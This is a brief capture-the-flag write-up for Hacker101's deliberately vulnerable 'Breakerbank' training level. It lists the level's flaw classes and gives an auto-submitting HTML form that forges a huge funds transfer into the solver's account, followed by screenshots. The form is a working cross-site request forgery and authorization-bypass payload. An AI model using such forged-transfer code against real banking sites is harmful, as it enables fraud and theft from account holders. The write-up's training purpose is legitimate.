# Level 0: Breakerbank 

```

		In this level, there are 4 vulnerabilities, falling into the following classes:
		CSRF
		Reflected XSS
		Authorization Bypass/Direct Object Reference

		Have fun!
		
```

## Authentication Bypass/Direct Object Reference

### POST form with any value after editing the page source starting from body 

```javascript
<body onload="javascript:a()"></body>
<script type="text/javascript">function a(){document.getElementById("button").click();}</script>
<h1>Breakerbank</h1>
Your account number: 961<br><br>
<form action="https://levels-a.hacker101.com/levels/0/" method="POST">
    <h2>Transfer Funds</h2><br>
    <input type="input" name="from" value="1"><br>
    <input type="input" name="to" value="961"><br>
    <input type="input" name="amount" value="99999999999"><br><br>
    <input id="button" type="submit" value="Transfer" >
</form>
```

***Upon successful code injection***
![Upon Successful code injection](https://github.com/Isopach/Hacker101/blob/master/img/level0_auth_bypass0.png)

***After POST***
![After POST](https://github.com/Isopach/Hacker101/blob/master/img/level0_auth_bypass1.png)

----
